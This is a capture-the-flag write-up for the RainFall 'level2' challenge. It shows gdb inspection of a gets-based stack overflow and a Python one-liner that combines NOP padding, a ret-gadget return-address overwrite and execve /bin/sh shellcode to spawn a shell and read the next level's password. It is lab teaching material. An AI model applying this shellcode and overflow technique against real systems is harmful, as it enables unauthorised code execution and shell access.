We examine the binary, when entering gdb, we need to unset `LINES` and `COLUMNS` variables from the environment to keep our exploit addresses the same when launching them in our environment.
```
(gdb) unset env LINES
(gdb) unset env COLUMNS
```
We then basically deconstructed the `main` and the function `p`, and examined them carefully. \
The main calls p, and does nothing else. \
p does a few thing which we wont explain here because it would take too long and we wrote a bin.c file to show what it does. \
So we have noticed we can erase the `eip` return value to match something to execute on the stack (like a shellcode).
```
(gdb) disas p
   ...
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   ...
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret

(gdb) b *0x0804853d
(gdb) r < <(python -c 'print "A"*80')
(gdb) x/48wx $esp
(gdb) x/48wx $esp
0xbffff6b0:	0xbffff6cc	0x00000000	0x00000000	0xb7e5ec73
0xbffff6c0:	0x080482b5	0x00000000	0x00ca0000	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x08048500
0xbffff710:	0x41414141	0x41414141	0x41414141	0x08048500
                                    |__the ebp  |__ the old eip
(gdb) x/4wx $ebp
0xbffff718:	0x41414141	0x08048500	0x08048550	0x00000000
...
```

We fill in our buffer with `NOP` values, then write some zeroes to overwrite the `ebp` register, then we overwrite the `eip` to jump on the `ret` instruction of the `p` function, then we write the next adress that will be assigned to the `eip` which is the address of the next instruction in the stack, and the next instruction will be the shellcode we write next. \
When we execute our exploit, the eip will jump twice to get to the address of the shellcode and execute it step by step to give us access to a shell (and as stdin is blocked we still need to keep the entry open with `cat path -`) !
```shell
$ python -c 'print "\x90" * 76 + "\x00\x00\x00\x00" + "\x3e\x85\x04\x08" + "\x24\xf7\xff\xbf" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"' > /tmp/exploit
level2@RainFall:~$ cat /tmp/exploit - | ./level2
����������������������������������������������������������������>��������
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
